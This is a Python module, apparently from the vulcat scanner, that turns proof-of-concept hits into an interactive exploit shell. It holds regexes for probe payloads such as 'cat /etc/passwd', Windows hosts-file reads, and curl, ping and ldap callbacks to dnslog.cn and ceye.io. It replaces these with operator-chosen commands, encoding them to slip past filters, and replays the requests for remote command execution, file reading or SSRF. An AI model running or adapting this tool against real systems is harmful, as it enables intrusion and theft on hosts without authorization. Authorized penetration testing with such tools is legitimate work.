#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
    将POC转换为EXP
'''

from lib.initial.config import config
from lib.tool.logger import logger
from lib.report import output
from thirdparty import HackRequests
from urllib import parse as urllib_parse
import re
import socket

class Shell():
    def __init__(self):
        self.lang = config.get('lang')['shell']
        self.timeout = config.get('timeout')
        # self.proxies = config.get('proxies')
        self.proxy = config.get('proxy')
        self.vulnType = str(config.get('vulnType')).lower()
        
        self.rce_old_payload_re_list = [                 # * RCE漏洞的旧command正则, 搜索并替换为用户自定义的新command
            r'echo(\s|%20|\${IFS})?'\
                '([0-9a-z]){6,8}',
            r'cat(\s|%20)?'\
                '(/|%2f|%2F)?'\
                    'etc/(/|%2f|%2F)?passwd',
            r'phpinfo\(?\)?',
            r'print_?r?(\(|%28)\d{3,6}\*\d{3,6}(\)|%29)',
            r'print_?r?(\(|%28)([0-9a-z]){6,8}(\)|%29)',
            r'curl(\s|%20){1}'\
                '(http://)?'\
                '([0-9a-z]){6,10}\.'\
                '(([0-9a-z]){6,10}\.)?'\
                '(dnslog\.cn|ceye\.io){1}',
            r'ping(\s|%20){1}'\
                '(-c 4 |-c%204%20)?'\
                '([0-9a-z]){6,10}\.'\
                '(([0-9a-z]){6,10}\.)?'\
                '(dnslog\.cn|ceye\.io){1}',
            r'(dns|ldap|rmi){1}://'\
                '([0-9a-z]){6,10}\.'\
                '(([0-9a-z]){6,10}\.)?'\
                '(dnslog\.cn|ceye\.io){1}/'\
                '([0-9a-z]){4,10}',
        ]

        self.fileread_old_payload_re_list = [
            r'(/|%2f|%252f|%2F|%252F)?'\
                'etc(/|%2f|%252f|%2F|%252F)?passwd',
            r'C:(/|%2f|%2F)?'\
                'Windows(/|%2f|%2F)?'\
                'System32(/|%2f|%2F)?'\
                'drivers(/|%2f|%2F)?'\
                    'etc(/|%2f|%2F)?hosts',
            r'C:(\\|%5c|%5C)?'\
                'Windows(\\|%5c|%5C)?'\
                'System32(\\|%5c|%5C)?'\
                'drivers(\\|%5c|%5C)?'\
                    'etc(\\|%5c|%5C)?hosts',
        ]
        
        self.ssrf_old_payload_re_list = [
            # r'(http|https|dns|ldap|rmi){1}://'\
            r'(http|https){1}://'\
                '([0-9a-z]){6,10}\.'\
                '(([0-9a-z]){6,10}\.)?'\
                '(dnslog\.cn|ceye\.io){1}',
        ]
        
    def start(self, results):
        ''' 启动shell
                # * 1. 判断有无Request
                    search_requests()
                        Request -> self.shell_raw() -> HackRequests.httpraw()
                
                # * 2. 更新漏洞的Payload
                    search_command()
                        接收用户输入的command
                            exit -> 退出Shell模式
                            其它命令 -> 查找旧command
                                查找失败 -> 退出Shell模式
                                替换为新command -> 返回新的Request/Target
                
                # * 3. 使用新Payload请求, 判断Shell请求是否成功
                    shell_request()
                        HackRequests.httpraw() / requests.get()
                            请求失败 -> 返回第2步
                            请求成功 -> 返回请求结果res
                
                # * 4. 查找回显并显示
                    search_response()
                        有回显and查找成功 -> 显示回显 -> 返回第2步
                        查找失败 -> 返回第2步
            :param results(list): vulcat返回的多个poc扫描结果
        '''
        
        # ! 遍历poc结果, 判断单个poc结果的漏洞类型, 分发给相应的漏洞Shell
        for result in results:
            if result and ('rce' in self.vulnType):
                self.shell(result, self.rce_old_payload_re_list)
            elif result and ('fileread' in self.vulnType):
                self.shell(result, self.fileread_old_payload_re_list)
            elif result and ('fileinclude' in self.vulnType):
                self.shell(result, self.fileread_old_payload_re_list)
            elif result and ('ssrf' in self.vulnType):
                self.shell(result, self.ssrf_old_payload_re_list)
            
            elif result and (re.search(r'rce', str(result['Type']), re.I)):
                self.shell(result, self.rce_old_payload_re_list)
            elif result and (re.search(r'file-?read', str(result['Type']), re.I)):
                self.shell(result, self.fileread_old_payload_re_list)
            elif result and (re.search(r'file-?include', str(result['Type']), re.I)):
                self.shell(result, self.fileread_old_payload_re_list)
            elif result and (re.search(r'ssrf', str(result['Type']), re.I)):
                self.shell(result, self.ssrf_old_payload_re_list)
                # self.fileinclude(result, self.fileinclude_old_payload_re_list)
            # elif result and ('sqlinject' in str(result['Type']).lower()):
            #     self.rce(result)
            # elif result and ('ssrf' in str(result['Type']).lower()):
            #     self.rce(result)
            else:
                logger.info('yellow_ex', self.lang['not_shell'])
                

    def shell(self, result, re_list):
        ''' 漏洞通用Shell
            :param result(dict): vulcat的单个poc扫描结果
        '''
        if self.vulnType != 'none':
            logger.info('red_ex', self.lang['identify'].format(self.vulnType))
        else:
            logger.info('red_ex', self.lang['identify'].format(result['Type'][1]))
            
        
        http_raw = self.search_requests(result)                     # * 判断result是否带有Request请求包

        if http_raw:
            # * HackRequests.httpraw()
            self.shell_raw(result, http_raw, re_list)
        else:
            logger.info('yellow_ex', self.lang['not_request'])      # ? 日志, 没有Request, 无法使用Shell
    
    def search_requests(self, result):
        ''' 搜索一个result里面是否有返回Request
                :param result(dict): vulcat的单个poc扫描结果
                :return: 一个str形式的http数据包
        '''
        
        list_requests = [
            'Request',
            # 'Request-1',
            # 'Request-2',
            # 'Request-3',
        ]
        
        for lr in list_requests:
            if str(result.get(lr, '')):
                res_info = output.output_vul_info(result, old_str='')       # * 获取一个无颜色的http请求数据包
                raw_start = res_info.find('[Request') + len('[Request')
                raw_end = res_info.rfind(']', raw_start)
                http_raw = res_info[raw_start:raw_end]                      # * 截取[Request 数据包 ]
                return http_raw

        return None
    
    def search_command(self, re_list, old_payload):
        ''' 搜索一个Request/Target中的旧payload, 替换为新payload并返回新的Request/Target
                :param re_list(list): 旧payload的正则列表
                :param old_payload(str): 要搜索的Request/Target
                :return:
                    新Request/Target
                    是否退出shell模式
                    vcsearch字符串
        '''
        new_command = ''
        
        # todo 输入自定义的命令, exit则退出Shell模式
        while not new_command:
            try:
                logger.info('red', '[Shell] ', print_end='')
                logger.info('reset', self.lang['input_command'], notime=True, print_end='')     # ? 日志, 请输入command
                new_command = input()
                
                '''vulcat shell响应包内容搜索 (类似linux中的grep)
                        可以搜索响应数据包中的内容, 正则表达式形式
                '''
                # todo 判断自定义命令中 是否有vulcat Shell Response Search
                vcsearch_re = r'\s*\|\s*vcsearch .*'
                vc_str = re.search(vcsearch_re, new_command, re.I|re.M)
                if vc_str:
                    vc_str = vc_str.group()
                    new_command = new_command.replace(vc_str, '')       # * 去掉命令中的vcsearch语法
                    
                    # * 只获取搜索的字符串
                    vc_start = vc_str.index('vcsearch ') + len('vcsearch ')
                    vc_str = vc_str[vc_start:]
                    vc_str = vc_str.strip('\'').strip('"')
                
                if not new_command:
                    logger.info('yellow_ex', self.lang['not_command'], notime=True)     # ? 日志, command不能为空
                    continue
                elif new_command == 'exit':
                    return None, True, vc_str
            except KeyboardInterrupt:
                print()
                return None, True, None
        
        # todo 将数据包中的Content-Length: xxx去掉, 否则会影响HackRequests
        is_contentLength = re.search(r'Content-Length: \d{1,9999}\r?\n{1}', old_payload, re.I|re.M)
        if is_contentLength:
            old_payload = old_payload.replace(is_contentLength.group(0), '')


        # todo 遍历正则列表, 查找旧的command, 替换为新的command并返回
        for rl in re_list:
            is_command = re.search(rl, old_payload, re.M|re.S)
            if is_command:
                old_command = is_command.group(0)
                if ('%20' in old_command):                                  # * RCE的空格
                    new_command = self.url_encode(new_command, 1)               # * 1次url编码, 默认编码
                elif (re.search(r'(%2f|%2F)', old_command, re.M|re.S)):     # * FileRead的/
                    new_command = self.url_encode(new_command, 1, 'utf-8')      # * 1次url编码, utf-8
                elif (re.search(r'(%252f|%252F)', old_command, re.M|re.S)): # * FileRead的/
                    new_command = self.url_encode(new_command, 2, 'utf-8')      # * 2次url编码, utf-8
                elif (re.search(r'\$\{IFS\}', old_command, re.M|re.S)):     # * Nexus命令执行的空格
                    new_command = new_command.replace(' ', '${IFS}')            # * 替换空格为Linux下的${IFS}
                
                new_payload = old_payload.replace(old_command, new_command)
                    
                return new_payload, False, vc_str

        logger.info('yellow_ex', self.lang['not_search_command'])
        return None, True, vc_str
    
    def url_encode(self, src_str, num, code=None):
        dst_str = src_str
        
        for i in range(num):
            if code:
                dst_str = urllib_parse.quote(dst_str, code)
            else:
                dst_str = urllib_parse.quote(dst_str)
        
        return dst_str
    
    def search_response(self, vc_str, res_response):
        ''' 搜索一个Response里面是否有正确的回显
                :param res_re(str): 要查找的Response正则
                :param res_text(str): requests的响应包内容Response.text
                :return: None
        '''
        
        try:
            # * 是否使用vcsearch搜索Response.text的内容
            if not vc_str:
                print('====================Response====================')
                print(res_response)
                print('====================Response====================')
            else:
                r = re.compile(vc_str, re.I|re.M|re.S)          # * 根据用户输入的正则, 新建一个正则对象r
                vc_text_list = r.findall(res_response)          # * 使用正则对象r, 匹配Response.text中的内容
                
                if vc_text_list:
                    print('====================Response-vcsearch====================')
                    for vc_text in vc_text_list:
                        print(vc_text, end='\n\n')
                    print('====================Response-vcsearch====================')
                else:
                    print(self.lang['not_response'])                            # ? 日志, 没有匹配到响应内容
        except re.error:
            print(self.lang['re_error'])                                        # ? 日志, 正则表达式输入有误

    def shell_request(self, result, http_raw, is_ssl=False):
        ''' 通用请求
                :param result(dict): vulcat的单个poc扫描结果
                :param http_raw(str): poc返回的http请求包
                :is_ssl: http请求包是否使用HTTPS
                    True -> HTTPS
                    False -> HTTP
                :return: requests.Request
        '''
        vul_info = {}
        vul_info['app_name'] = result['Type'][0] + '(Shell)'
        vul_info['vul_type'] = 'Shell-' + result['Type'][1]
        vul_info['vul_id'] = result['Type'][2]

        if 'https' in result['Target']:
            is_ssl = True
        
        try:
            hack = HackRequests.hackRequests(timeout=self.timeout)
            res = hack.httpraw(
                http_raw,
                ssl=is_ssl,
                proxy=self.proxy,
                location=False
            )

            # res.method = 'Shell'
            logger.logging(vul_info, res.status_code, res)                        # * LOG
            
            return res
        except socket.timeout:
            logger.logging(vul_info, 'Timeout')
            return None
        except ConnectionRefusedError:
            logger.logging(vul_info, 'Faild')
            return None
        except:
            logger.logging(vul_info, 'Error')
            return None
    
    def shell_raw(self, result, http_raw, re_list):
        ''' 使用http数据包(Request)进行shell
            while
                if is_exit 是否退出Shell模式
                if new_http_raw 是否成功更新了payload
                    是 -> 发起请求
                    否 -> 更新payload失败
                if res 是否请求成功
                    是 -> 查找/显示Response内容
                    否 -> shell请求失败
                    
            :param result: vulcat返回的单个poc扫描结果
            :param http_raw: HTTP请求数据包
        '''
        while True:
            new_http_raw, is_exit, vc_str = self.search_command(re_list, http_raw)

            if is_exit:
                logger.info('cyan_ex', self.lang['exit'])                       # ? 日志, 退出Shell模式
                break
            
            if new_http_raw:
                res = self.shell_request(result, new_http_raw)
                
                if res:
                    self.search_response(vc_str, str(res.header) + res.text)
                else:
                    logger.info('red', self.lang['shell_faild'])                  # ? 日志, shell请求失败
            else:
                logger.info('red_ex', self.lang['faild_command'])               # ? 日志, 更新payload失败

shell = Shell()